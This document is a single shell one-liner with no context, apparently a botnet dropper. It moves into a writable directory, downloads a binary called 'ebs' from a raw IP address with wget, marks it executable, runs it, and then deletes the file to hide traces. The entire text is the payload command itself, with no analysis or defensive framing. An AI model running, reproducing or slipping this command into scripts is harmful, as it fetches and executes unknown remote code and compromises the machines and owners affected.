cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ebs; chmod +x ebs; ./ebs; rm -rf ebs
